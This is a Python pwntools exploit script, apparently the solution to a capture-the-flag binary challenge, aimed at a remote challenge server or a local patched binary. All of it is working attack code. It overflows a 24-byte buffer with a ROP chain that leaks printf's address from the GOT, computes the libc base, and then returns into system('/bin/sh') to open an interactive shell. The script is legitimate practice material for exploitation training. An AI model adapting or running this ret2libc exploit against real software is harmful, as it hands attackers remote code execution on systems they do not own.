#!/usr/bin/env python3

from pwn import *
import time

exe   = ELF("./main_patched")
libc  = ELF("./libc.so.6")
ld    = ELF("./ld-2.35.so")

context.binary = exe
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r, '''
            echo "hi"
            break main
            continue
            ''')  # Use tmux
        if args.DEBUG:
            pass
    else:
        r = remote("ctf-chall.stembascc.com", 5229)
    return r

def main():
    rop = ROP(exe)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    ret     = rop.find_gadget(['ret'])[0]

    r = conn()
    # gdb.attach(r)

    log.info("Stage 1: Mengirim payload leak...")
    log.info(f"pop rdi: {hex(pop_rdi)}")
    log.info(f"ret: {hex(ret)}")
    log.info(f"got printf: {hex(exe.got['printf'])}")
    log.info(f"plt printf: {hex(exe.plt['printf'])}")
    log.info(f"libc printf: {hex(libc.sym['printf'])}")
    
    payload  = b"A" * 24
    payload += p64(pop_rdi)
    payload += p64(exe.got['printf'])
    payload += p64(ret)             
    payload += p64(exe.plt['printf'])
    payload += p64(exe.sym['main'] + 5)

    write("payload",payload)
    r.sendafter(b'$ ', payload)
    r.sendafter(b'$ ', b'exit')
    # time.sleep(20)
    # info.log("start:")
    
    data = r.recv(4096)
    leak_data = data.strip()  
    leak_data = leak_data.replace(b'$', b'')
    log.info("Leak data: " + repr(leak_data))
    leaked_printf = u64(leak_data.ljust(8, b'\x00'))
    libc.address = leaked_printf - libc.sym['printf']
    bin_sh = next(libc.search(b"/bin/sh\x00"))
    system_addr = libc.sym["system"]
    log.info("Libc: " + hex(libc.address))
    log.info("Address '/bin/sh': " + hex(bin_sh))
    log.info("Address system: " + hex(system_addr))
    
    payload  = b"A" * 24
    payload += p64(pop_rdi)
    payload += p64(bin_sh)
    payload += p64(ret) 
    payload += p64(system_addr)
    r.send(payload)
    r.interactive()
        
    

if __name__ == "__main__": 
    main()
